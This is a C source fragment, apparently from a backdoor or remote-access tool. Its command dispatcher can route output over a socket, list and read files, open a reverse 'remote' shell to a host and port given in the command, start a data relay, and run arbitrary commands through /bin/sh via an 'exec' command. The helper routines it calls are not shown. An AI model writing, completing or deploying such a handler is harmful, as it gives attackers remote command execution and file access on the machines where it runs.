#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifdef _WIN32
#define SHELL_MODE command_mode
#else
#define SHELL_MODE shell_mode
#endif

int shell_command(const char *input, int use_socket, int socket_fd)
{
    FILE *out = (use_socket && socket_fd > 0) ? fdopen(socket_fd, "w") : stdout;
    
    if (strcmp(input, "exit") == 0) {
        if (use_socket && socket_fd > 0) fclose(out);
        return -1;
    }
    else if (strncmp(input, "ls", 2) == 0) {
        char *arg = input + 2;
        while (*arg == ' ') arg++;
        if (*arg == '\0')
            handle_list(out);
        else
            handle_read(arg, out);
    }
    else if (strncmp(input, "remote ", 7) == 0) {
        char host[256];
        int port;
        if (sscanf(input + 7, "%s %d", host, &port) == 2)
            remote_shell_mode(host, port);
        else
            fprintf(out, "Usage: remote host port\n");
    }
    else if (strcmp(input, "genie") == 0) {
        genie_mode();
    }
    else if (strcmp(input, "shell") == 0) {
        SHELL_MODE();
    }
    else if (strcmp(input, "datapipe") == 0) {
        pid_t pid = fork();
        if (pid == 0) {
            datapipe_mode(NULL, 0, NULL, 0);
            exit(0);
        }
    }
    else if (strncmp(input, "exec ", 5) == 0) {
        pid_t pid = fork();
        if (pid == 0) {
            execlp("/bin/sh", "sh", "-c", input + 5, NULL);
            exit(0);
        }
    }
    else {
        fprintf(out, "Unknown command\n");
    }
        
    return 0;
}